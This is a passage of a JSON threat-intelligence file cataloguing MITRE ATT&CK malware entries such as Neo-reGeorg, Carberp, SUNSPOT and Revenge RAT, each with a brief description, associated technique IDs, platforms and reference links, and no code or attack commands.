        "T1559.001",
        "T1025",
        "T1546.010"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0458",
      "stix_id": "malware--ba09b86c-1c40-4ff1-bda0-0d8c4ca35997",
      "created": "2020-05-27T16:58:08.242000+00:00",
      "modified": "2025-04-25T14:44:32.751000+00:00"
    },
    "S1189": {
      "id": "S1189",
      "name": "Neo-reGeorg",
      "description": "[Neo-reGeorg](https://attack.mitre.org/software/S1189) is an open-source web shell designed as a restructuring of [reGeorg](https://attack.mitre.org/software/S1187) with improved usability, security, and fixes for exising [reGeorg](https://attack.mitre.org/software/S1187) bugs.(Citation: GitHub Neo-reGeorg 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1572",
        "T1105",
        "T1095",
        "T1071.001",
        "T1090",
        "T1059.006",
        "T1132.002",
        "T1505.003"
      ],
      "platforms": [
        "Network Devices",
        "Windows",
        "macOS",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1189",
      "stix_id": "malware--bae6edd1-eb36-4581-ba7e-6cbfe0e24eac",
      "created": "2025-01-06T18:46:47.242000+00:00",
      "modified": "2025-04-15T19:46:35.142000+00:00"
    },
    "S0076": {
      "id": "S0076",
      "name": "FakeM",
      "description": "[FakeM](https://attack.mitre.org/software/S0076) is a shellcode-based Windows backdoor that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1095",
        "T1573.001",
        "T1056.001",
        "T1001.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0076",
      "stix_id": "malware--bb3c1098-d654-4620-bf40-694386d28921",
      "created": "2017-05-31T21:32:52.470000+00:00",
      "modified": "2025-04-25T14:44:33.289000+00:00"
    },
    "S0484": {
      "id": "S0484",
      "name": "Carberp",
      "description": "[Carberp](https://attack.mitre.org/software/S0484) is a credential and information stealing malware that has been active since at least 2009. [Carberp](https://attack.mitre.org/software/S0484)'s source code was leaked online in 2013, and subsequently used as the foundation for the [Carbanak](https://attack.mitre.org/software/S0030) backdoor.(Citation: Trend Micro Carberp February 2014)(Citation: KasperskyCarbanak)(Citation: RSA Carbanak November 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1542.003",
        "T1555",
        "T1036.005",
        "T1014",
        "T1056.004",
        "T1547.001",
        "T1497",
        "T1041",
        "T1105",
        "T1021.005",
        "T1562.001",
        "T1185",
        "T1068",
        "T1055.004",
        "T1518.001",
        "T1012",
        "T1564.001",
        "T1071.001",
        "T1027.013",
        "T1106",
        "T1055.001",
        "T1082",
        "T1113",
        "T1057",
        "T1555.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0484",
      "stix_id": "malware--bbcd7a02-ef24-4171-ac94-a93540173b94",
      "created": "2020-07-15T19:48:35.063000+00:00",
      "modified": "2024-04-11T02:47:56.829000+00:00"
    },
    "S1120": {
      "id": "S1120",
      "name": "FRAMESTING",
      "description": "[FRAMESTING](https://attack.mitre.org/software/S1120) is a Python web shell that was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to embed into an Ivanti Connect Secure Python package for command execution.(Citation: Mandiant Cutting Edge Part 2 January 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1001.003",
        "T1071.001",
        "T1505.003",
        "T1059.006",
        "T1001",
        "T1140",
        "T1554"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1120",
      "stix_id": "malware--bcaae558-9697-47a2-9ec7-c75000ddf58c",
      "created": "2024-03-08T20:20:05.588000+00:00",
      "modified": "2025-04-15T19:46:35.229000+00:00"
    },
    "S0246": {
      "id": "S0246",
      "name": "HARDRAIN",
      "description": "[HARDRAIN](https://attack.mitre.org/software/S0246) is a Trojan malware variant reportedly used by the North Korean government. (Citation: US-CERT HARDRAIN March 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1571",
        "T1090",
        "T1059.003",
        "T1001.003",
        "T1562.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0246",
      "stix_id": "malware--bd0536d7-b081-43ae-a773-cfb057c5b988",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:34.161000+00:00"
    },
    "S1107": {
      "id": "S1107",
      "name": "NKAbuse",
      "description": "[NKAbuse](https://attack.mitre.org/software/S1107) is a Go-based, multi-platform malware abusing NKN (New Kind of Network) technology for data exchange between peers, functioning as a potent implant, and equipped with both flooder and backdoor capabilities.(Citation: NKAbuse BC)(Citation: NKAbuse SL)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.004",
        "T1057",
        "T1016.001",
        "T1498",
        "T1082",
        "T1090.003",
        "T1113",
        "T1053.003"
      ],
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1107",
      "stix_id": "malware--bd2ebee8-7c38-408a-871d-221012104222",
      "created": "2024-02-08T15:41:33.284000+00:00",
      "modified": "2024-04-13T14:10:23.936000+00:00"
    },
    "S0517": {
      "id": "S0517",
      "name": "Pillowmint",
      "description": "[Pillowmint](https://attack.mitre.org/software/S0517) is a point-of-sale malware used by [FIN7](https://attack.mitre.org/groups/G0046) designed to capture credit card information.(Citation: Trustwave Pillowmint June 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1546.011",
        "T1055.004",
        "T1112",
        "T1012",
        "T1027",
        "T1027.015",
        "T1027.011",
        "T1070.009",
        "T1057",
        "T1106",
        "T1059.001",
        "T1140",
        "T1005",
        "T1070.004",
        "T1560"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0517",
      "stix_id": "malware--bd7a9e13-69fa-4243-a5e5-04326a63f9f2",
      "created": "2020-07-27T14:06:29.560000+00:00",
      "modified": "2025-04-16T20:38:33.297000+00:00"
    },
    "S0682": {
      "id": "S0682",
      "name": "TrailBlazer",
      "description": "[TrailBlazer](https://attack.mitre.org/software/S0682) is a modular malware that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2019.(Citation: CrowdStrike StellarParticle January 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1001.001",
        "T1001",
        "T1071.001",
        "T1036",
        "T1546.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0682",
      "stix_id": "malware--bdad6f3b-de88-42fa-9295-d29b5271808e",
      "created": "2022-02-08T15:38:55.209000+00:00",
      "modified": "2025-04-16T20:38:33.457000+00:00"
    },
    "S0379": {
      "id": "S0379",
      "name": "Revenge RAT",
      "description": "[Revenge RAT](https://attack.mitre.org/software/S0379) is a freely available remote access tool written in .NET (C#).(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1056.001",
        "T1105",
        "T1003",
        "T1125",
        "T1021.001",
        "T1082",
        "T1132.001",
        "T1102.002",
        "T1016",
        "T1218.005",
        "T1547.004",
        "T1123",
        "T1059.003",
        "T1059.001",
        "T1202",
        "T1113",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0379",
      "stix_id": "malware--bdb27a1d-1844-42f1-a0c0-826027ae0326",
      "created": "2019-05-02T01:07:36.780000+00:00",
      "modified": "2024-11-17T23:54:41.761000+00:00"
    },
    "S1016": {
      "id": "S1016",
      "name": "MacMa",
      "description": "[MacMa](https://attack.mitre.org/software/S1016) is a macOS-based backdoor with a large set of functionalities to control and exfiltrate files from a compromised computer. [MacMa](https://attack.mitre.org/software/S1016) has been observed in the wild since November 2021.(Citation: ESET DazzleSpy Jan 2022) [MacMa](https://attack.mitre.org/software/S1016) shares command and control and unique libraries with [MgBot](https://attack.mitre.org/software/S1146) and [Nightdoor](https://attack.mitre.org/software/S1147), indicating a relationship with the [Daggerfly](https://attack.mitre.org/groups/G1034) threat actor.(Citation: Symantec Daggerfly 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1082",
        "T1095",
        "T1553.002",
        "T1113",
        "T1016",
        "T1074.001",
        "T1543.001",
        "T1005",
        "T1070.002",
        "T1021",
        "T1106",
        "T1123",
        "T1555.001",
        "T1041",
        "T1057",
        "T1070.006",
        "T1571",
        "T1140",
        "T1056.001",
        "T1059.004",
        "T1553.001",
        "T1105",
        "T1573",
        "T1083",
        "T1070.004"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S1016",
      "stix_id": "malware--bdee9574-7479-4073-a7dc-e86d8acd073a",
      "created": "2022-05-06T01:29:34.860000+00:00",
      "modified": "2024-07-26T17:48:10.580000+00:00"
    },
    "S1044": {
      "id": "S1044",
      "name": "FunnyDream",
      "description": "[FunnyDream](https://attack.mitre.org/software/S1044) is a backdoor with multiple components that was used during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign since at least 2019, primarily for execution and exfiltration.(Citation: Bitdefender FunnyDream Campaign November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.003",
        "T1547.001",
        "T1047",
        "T1120",
        "T1074.001",
        "T1559.001",
        "T1218.011",
        "T1055.001",
        "T1572",
        "T1057",
        "T1036.004",
        "T1041",
        "T1018",
        "T1056.001",
        "T1016",
        "T1033",
        "T1124",
        "T1012",
        "T1119",
        "T1113",
        "T1090",
        "T1560.002",
        "T1105",
        "T1070",
        "T1106",
        "T1005",
        "T1001",
        "T1560.003",
        "T1025",
        "T1518.001",
        "T1059.003",
        "T1027.013",
        "T1082",
        "T1070.004",
        "T1083",
        "T1095",
        "T1010"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1044",
      "stix_id": "malware--be25c1c0-1590-4219-a3d5-6f31799d1d1b",
      "created": "2022-09-23T14:26:54.392000+00:00",
      "modified": "2024-04-11T02:30:25.854000+00:00"
    },
    "S1150": {
      "id": "S1150",
      "name": "ROADSWEEP",
      "description": "[ROADSWEEP](https://attack.mitre.org/software/S1150) is a ransomware that was deployed against Albanian government networks during [HomeLand Justice](https://attack.mitre.org/campaigns/C0038) along with the [CHIMNEYSWEEP](https://attack.mitre.org/software/S1149) backdoor.(Citation: Mandiant ROADSWEEP August 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1027.013",
        "T1553.002",
        "T1559",
        "T1486",
        "T1491.001",
        "T1140",
        "T1547.001",
        "T1082",
        "T1120",
        "T1489",
        "T1480",
        "T1083",
        "T1490",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1150",
      "stix_id": "malware--be471c69-12d5-4bcc-9dad-3d42c3dbca4b",
      "created": "2024-08-08T17:32:30.731000+00:00",
      "modified": "2024-08-09T17:27:24.399000+00:00"
    },
    "S0562": {
      "id": "S0562",
      "name": "SUNSPOT",
      "description": "[SUNSPOT](https://attack.mitre.org/software/S0562) is an implant that injected the [SUNBURST](https://attack.mitre.org/software/S0559) backdoor into the SolarWinds Orion software update framework. It was used by [APT29](https://attack.mitre.org/groups/G0016) since at least February 2020.(Citation: CrowdStrike SUNSPOT Implant January 2021) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1134",
        "T1070.004",
        "T1027",
        "T1565.001",
        "T1083",
        "T1480",
        "T1195.002",
        "T1106",
        "T1480.002",
        "T1140",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0562",
      "stix_id": "malware--bf48e7f8-752c-4ce8-bf8f-748edacd8fa6",
      "created": "2021-01-12T16:14:28.845000+00:00",
      "modified": "2025-04-16T20:38:33.634000+00:00"
    },
    "S0284": {
      "id": "S0284",
      "name": "More_eggs",
      "description": "[More_eggs](https://attack.mitre.org/software/S0284) is a JScript backdoor used by [Cobalt Group](https://attack.mitre.org/groups/G0080) and [FIN6](https://attack.mitre.org/groups/G0037). Its name was given based on the variable \"More_eggs\" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4. (Citation: Talos Cobalt Group July 2018)(Citation: Security Intelligence More Eggs Aug 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1016.001",
        "T1140",
        "T1082",
        "T1071.001",
        "T1573.001",
        "T1059.003",
        "T1027.013",
        "T1070.004",
        "T1016",
        "T1132.001",
        "T1518.001",
        "T1553.002",
        "T1218.010",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0284",
      "stix_id": "malware--bfd2738c-8b43-43c3-bc9f-d523c8e88bf4",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-11T00:40:07.038000+00:00"
    },
    "S0663": {
      "id": "S0663",
      "name": "SysUpdate",
      "description": "[SysUpdate](https://attack.mitre.org/software/S0663) is a backdoor written in C++ that has been used by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2020.(Citation: Trend Micro Iron Tiger April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.004",
        "T1573.001",
        "T1007",
        "T1140",
        "T1132.001",
        "T1033",
        "T1057",
        "T1553.002",
        "T1005",
        "T1027.011",
        "T1083",
        "T1016.001",
        "T1105",
        "T1036.004",
        "T1041",
        "T1027.013",
        "T1082",
        "T1113",
        "T1543.002",
        "T1070.004",
        "T1112",
        "T1564.001",
        "T1574.001",
        "T1547.001",
        "T1016",
        "T1027.002",
        "T1106",
        "T1569.002",
        "T1047",
        "T1543.003"
      ],
      "platforms": [
        "Windows",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0663",
      "stix_id": "malware--c009560a-f097-45a3-8f9f-78ec1440a783",
      "created": "2021-11-29T18:37:40.308000+00:00",
      "modified": "2024-04-10T23:44:19.752000+00:00"
    },
    "S0004": {
      "id": "S0004",
      "name": "TinyZBot",
      "description": "[TinyZBot](https://attack.mitre.org/software/S0004) is a bot written in C# that was developed by [Cleaver](https://attack.mitre.org/groups/G0003). (Citation: Cylance Cleaver)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1115",
        "T1113",
        "T1547.009",
        "T1543.003",
        "T1547.001",
        "T1562.001",
        "T1056.001",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0004",
      "stix_id": "malware--c0c45d38-fe57-4cd4-b2b2-9ecd0ddd4ca9",
      "created": "2017-05-31T21:32:12.310000+00:00",
      "modified": "2025-04-16T20:38:33.790000+00:00"
    },
    "S1017": {
      "id": "S1017",
      "name": "OutSteel",
      "description": "[OutSteel](https://attack.mitre.org/software/S1017) is a file uploader and document stealer developed with the scripting language AutoIT that has been used by [Saint Bear](https://attack.mitre.org/groups/G1031) since at least March 2021.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1041",
        "T1566.002",
        "T1204.001",
        "T1005",
        "T1020",
        "T1059.010",
        "T1083",
        "T1119",
        "T1204.002",
        "T1566.001",
        "T1070.004",
        "T1570",
        "T1071.001",
        "T1105",
        "T1057",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1017",
      "stix_id": "malware--c113230f-f044-423b-af63-9b63c802f5ae",
      "created": "2022-06-09T16:07:23.821000+00:00",
      "modified": "2024-10-08T20:11:00.316000+00:00"
    },
    "S0475": {
      "id": "S0475",
      "name": "BackConfig",
      "description": "[BackConfig](https://attack.mitre.org/software/S0475) is a custom Trojan with a flexible plugin architecture that has been used by [Patchwork](https://attack.mitre.org/groups/G0040).(Citation: Unit 42 BackConfig May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1553.002",
        "T1059.005",
        "T1059.003",
        "T1105",
        "T1106",
        "T1083",
        "T1137.001",
        "T1070.004",
        "T1082",
        "T1027.010",
        "T1564.001",
        "T1053.005",
        "T1071.001",
        "T1140",
        "T1036.005",
        "T1204.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0475",
      "stix_id": "malware--c13d9621-aca7-436b-ab3d-3a95badb3d00",
      "created": "2020-06-17T20:17:37.168000+00:00",
      "modified": "2025-04-16T20:38:33.939000+00:00"
    },
    "S1046": {
      "id": "S1046",
      "name": "PowGoop",
      "description": "[PowGoop](https://attack.mitre.org/software/S1046) is a loader that consists of a DLL loader and a PowerShell-based downloader; it has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) as their main loader.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573",
        "T1036",
        "T1071.001",
        "T1059.001",
        "T1574.001",
        "T1140",
        "T1036.005",
        "T1132.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1046",
      "stix_id": "malware--c19d19ae-dd58-4584-8469-966bbeaa80e3",
      "created": "2022-09-29T15:44:58.517000+00:00",
      "modified": "2025-04-16T20:38:34.085000+00:00"
    },
    "S0236": {
      "id": "S0236",
      "name": "Kwampirs",
      "description": "[Kwampirs](https://attack.mitre.org/software/S0236) is a backdoor Trojan used by [Orangeworm](https://attack.mitre.org/groups/G0071). [Kwampirs](https://attack.mitre.org/software/S0236) has been found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines.(Citation: Symantec Orangeworm April 2018) [Kwampirs](https://attack.mitre.org/software/S0236) has multiple technical overlaps with [Shamoon](https://attack.mitre.org/software/S0140) based on reverse engineering analysis.(Citation: Cylera Kwampirs 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1069.002",
        "T1087.001",
        "T1135",
        "T1140",
        "T1007",
        "T1083",
        "T1027.013",
        "T1543.003",
        "T1033",
        "T1018",
        "T1021.002",
        "T1027.001",
        "T1105",
        "T1082",
        "T1036.004",
        "T1218.011",
        "T1057",
        "T1049",
        "T1016",
        "T1201",
        "T1008",
        "T1069.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0236",
      "stix_id": "malware--c2417bab-3189-4d4d-9d60-96de2cdaf0ab",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-11T01:44:05.770000+00:00"
    },
    "S0210": {
      "id": "S0210",
      "name": "Nerex",
      "description": "[Nerex](https://attack.mitre.org/software/S0210) is a Trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Nerex May 2012)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1553.002",
        "T1543.003",
        "T1112"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0210",
      "stix_id": "malware--c251e4a5-9a2e-4166-8e42-442af75c3b9a",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.591000+00:00"
    },
    "S0635": {
      "id": "S0635",
      "name": "BoomBox",
      "description": "[BoomBox](https://attack.mitre.org/software/S0635) is a downloader responsible for executing next stage components that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1218.011",
        "T1105",
        "T1140",
        "T1102",
        "T1087.002",
        "T1071.001",
        "T1204.002",
        "T1082",
        "T1083",
        "T1036",
        "T1480",
        "T1547.001",
        "T1033",
        "T1567.002",
        "T1087.003",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0635",
      "stix_id": "malware--c26f1c05-b861-4970-94dc-2f7f921a3074",
      "created": "2021-08-03T14:55:46.682000+00:00",
      "modified": "2025-04-25T14:44:37.490000+00:00"
    },
    "S1052": {
      "id": "S1052",
      "name": "DEADEYE",
      "description": "[DEADEYE](https://attack.mitre.org/software/S1052) is a malware launcher that has been used by [APT41](https://attack.mitre.org/groups/G0096) since at least May 2021. [DEADEYE](https://attack.mitre.org/software/S1052) has variants that can either embed a payload inside a compiled binary (DEADEYE.EMBED) or append it to the end of a file (DEADEYE.APPEND).(Citation: Mandiant APT41)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1480",
        "T1218.007",
        "T1082",
        "T1027.009",
        "T1053",
        "T1106",
        "T1218.011",
        "T1059.003",
        "T1140",
        "T1016",
        "T1036.004",
        "T1564.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1052",
      "stix_id": "malware--c46eb8e6-bf29-4696-8008-3ddb0b4ca470",
      "created": "2022-12-20T21:08:56.465000+00:00",
      "modified": "2024-04-11T02:38:56.409000+00:00"
    },
    "S0197": {
      "id": "S0197",
      "name": "PUNCHTRACK",
      "description": "[PUNCHTRACK](https://attack.mitre.org/software/S0197) is non-persistent point of sale (POS) system malware utilized by [FIN8](https://attack.mitre.org/groups/G0061) to scrape payment card data. (Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1027",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0197",
      "stix_id": "malware--c4de7d83-e875-4c88-8b5d-06c41e5b7e79",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:38:34.395000+00:00"
    },
    "S0279": {
      "id": "S0279",
      "name": "Proton",
      "description": "[Proton](https://attack.mitre.org/software/S0279) is a macOS backdoor focusing on data theft and credential access  (Citation: objsee mac malware 2017).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.002",
        "T1543.001",
        "T1070.004",
        "T1021.005",
        "T1548.003",
        "T1555.001",
        "T1140",
        "T1555.003",
        "T1056.001",
        "T1555.005",
        "T1070.002",
        "T1113",
        "T1560",
        "T1059.004",
        "T1562.001"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0279",
      "stix_id": "malware--c541efb4-e7b1-4ad6-9da8-b4e113f5dd42",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:38.517000+00:00"
    },
    "S0001": {
      "id": "S0001",
      "name": "Trojan.Mebromi",
      "description": "[Trojan.Mebromi](https://attack.mitre.org/software/S0001) is BIOS-level malware that takes control of the victim before MBR. (Citation: Ge 2011)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1542.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0001",
      "stix_id": "malware--c5e9cb46-aced-466c-85ea-7db5572ad9ec",
      "created": "2017-05-31T21:32:11.148000+00:00",
      "modified": "2025-04-25T14:44:38.888000+00:00"
    },
    "S1169": {
      "id": "S1169",
      "name": "Mango",
      "description": "[Mango](https://attack.mitre.org/software/S1169) is a first-stage backdoor written in C#/.NET that was used by [OilRig](https://attack.mitre.org/groups/G0049) during the [Juicy Mix](https://attack.mitre.org/campaigns/C0044) campaign. [Mango](https://attack.mitre.org/software/S1169) is the successor to [Solar](https://attack.mitre.org/software/S1166) and includes additional exfiltration capabilities, the use of native APIs, and added detection evasion code.(Citation: ESET OilRig Campaigns Sep 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1082",
        "T1573.002",
        "T1027.013",
        "T1083",
        "T1204.002",
        "T1041",
        "T1071.001",
        "T1033",
        "T1562.001",
        "T1132.001",
        "T1106",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1169",
      "stix_id": "malware--c5ec3344-e156-4b41-accb-274362e5dae8",
      "created": "2024-11-25T22:02:34.362000+00:00",
      "modified": "2024-11-25T22:08:26.384000+00:00"
    },
    "S0259": {
      "id": "S0259",
      "name": "InnaputRAT",
      "description": "[InnaputRAT](https://attack.mitre.org/software/S0259) is a remote access tool that can exfiltrate files from a victim\u2019s machine. [InnaputRAT](https://attack.mitre.org/software/S0259) has been seen out in the wild since 2016. (Citation: ASERT InnaputRAT April 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1082",
        "T1027",
        "T1070.004",
        "T1083",
        "T1106",
        "T1036.004",
        "T1547.001",
        "T1543.003",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0259",
      "stix_id": "malware--c8b6cc43-ce61-42ae-87f3-a5f10526f952",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:39.436000+00:00"
    },
    "S1115": {
      "id": "S1115",
      "name": "WIREFIRE",
      "description": "[WIREFIRE](https://attack.mitre.org/software/S1115) is a web shell written in Python that exists as trojanized logic to the visits.py component of Ivanti Connect Secure VPN appliances. [WIREFIRE](https://attack.mitre.org/software/S1115) was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) for downloading files and command execution.(Citation: Mandiant Cutting Edge January 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1505.003",
        "T1105",
        "T1132.001",
        "T1573.001",
        "T1071.001",
        "T1554"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1115",
      "stix_id": "malware--c93e3079-43fb-4d8d-9e99-db63d07eadc9",
      "created": "2024-03-04T21:40:28.083000+00:00",
      "modified": "2025-04-15T19:46:35.314000+00:00"
    },
    "S0487": {
      "id": "S0487",
      "name": "Kessel",
      "description": "[Kessel](https://attack.mitre.org/software/S0487) is an advanced version of OpenSSH which acts as a custom backdoor, mainly acting to steal credentials and function as a bot. [Kessel](https://attack.mitre.org/software/S0487) has been active since its C2 domain began resolving in August 2018.(Citation: ESET ForSSHe December 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1105",
        "T1030",
        "T1059",
        "T1140",
        "T1016",
        "T1554",
        "T1082",
        "T1090",
        "T1556",
        "T1132.001",
        "T1560",
        "T1041",
        "T1048.003"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0487",
      "stix_id": "malware--c984b414-b766-44c5-814a-2fe96c913c12",
      "created": "2020-07-16T15:14:25.631000+00:00",
      "modified": "2024-04-11T01:48:38.105000+00:00"
    },
    "S0632": {
      "id": "S0632",
      "name": "GrimAgent",
      "description": "[GrimAgent](https://attack.mitre.org/software/S0632) is a backdoor that has been used before the deployment of [Ryuk](https://attack.mitre.org/software/S0446) ransomware since at least 2020; it is likely used by [FIN6](https://attack.mitre.org/groups/G0037) and [Wizard Spider](https://attack.mitre.org/groups/G0102).(Citation: Group IB GrimAgent July 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1059.003",
        "T1053.005",
        "T1005",
        "T1033",
        "T1573.002",
        "T1083",
        "T1105",
        "T1016",
        "T1132.001",
        "T1573.001",
        "T1106",
        "T1480.002",
        "T1614.001",
        "T1497.003",
        "T1614",
        "T1070.009",
        "T1140",
        "T1001.001",
        "T1070.004",
        "T1027",
        "T1071.001",
        "T1082",
        "T1041",
        "T1027.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0632",
      "stix_id": "malware--c9b99d03-ff11-4a48-95f0-82660d582c25",
      "created": "2021-07-16T18:19:25.986000+00:00",
      "modified": "2024-09-19T14:32:39.426000+00:00"
    },
    "S0582": {
      "id": "S0582",
      "name": "LookBack",
      "description": "[LookBack](https://attack.mitre.org/software/S0582) is a remote access trojan written in C++ that was used against at least three US utility companies in July 2019. The TALONITE activity group has been observed using [LookBack](https://attack.mitre.org/software/S0582).(Citation: Proofpoint LookBack Malware Aug 2019)(Citation: Dragos TALONITE)(Citation: Dragos Threat Report 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1489",
        "T1059.003",
        "T1059.005",
        "T1007",
        "T1057",
        "T1529",
        "T1036.005",
        "T1071.001",
        "T1113",
        "T1573.001",
        "T1547.001",
        "T1070.004",
        "T1095",
        "T1083",
        "T1140",
        "T1574.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0582",
      "stix_id": "malware--c9ccc4df-1f56-49e7-ad57-b383e1451688",
      "created": "2021-03-01T14:07:36.692000+00:00",
      "modified": "2025-04-25T14:44:40.541000+00:00"
    },
    "S1112": {
      "id": "S1112",
      "name": "STEADYPULSE",
      "description": "[STEADYPULSE](https://attack.mitre.org/software/S1112) is a web shell that infects targeted Pulse Secure VPN servers through modification of a legitimate Perl script that was used as early as 2020 including in activity against US Defense Industrial Base (DIB) entities.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1132.001",
        "T1505.003",
        "T1140",
        "T1071.001",
        "T1105"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1112",
      "stix_id": "malware--ca0fead6-5277-427a-825b-42ff1fbe476e",
      "created": "2024-02-09T20:19:34.719000+00:00",
      "modified": "2025-04-15T19:46:35.400000+00:00"
    },
    "S0611": {
      "id": "S0611",
      "name": "Clop",
